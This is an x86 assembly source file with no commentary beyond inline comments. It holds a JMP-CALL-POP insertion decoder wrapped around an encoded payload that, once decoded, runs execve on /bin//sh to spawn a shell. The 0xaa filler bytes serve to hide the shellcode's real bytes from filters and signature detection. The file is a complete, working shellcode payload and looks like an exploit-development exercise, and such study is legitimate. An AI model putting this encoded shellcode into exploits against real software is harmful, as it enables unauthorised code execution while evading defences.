global _start

section .text

_start:
    jmp short setshellcode

decoder:
    pop esi ; address of encoded shellcode
    lea edi, [esi + 1] ; address of first insertion 0xaa byte
    
    xor eax, eax ; reset insertion counter
    mov al, 1 ; start at 1
    xor ebx, ebx ; reset value counter


decode:
    mov bl, byte [esi + eax] ; load insertion byte
    xor bl, 0xaa ; xor out with 0xaa
    jnz short encoded ; if not null (0xbb at the end of the shellcode) we are done, execute shellcode
    mov bl, byte [esi + eax + 1] ; load the next byte after the insertion byte into bl
    mov byte [edi], bl ; move bl into the previous insertion byte location
    inc edi ; increment address by one
    add al, 2 ; increment insertion counter by two
    jmp short decode

setshellcode:
    call decoder
    encoded: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x6e,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0xb,0xaa,0xcd,0xaa,0x80,0xaa,0xbb,0xbb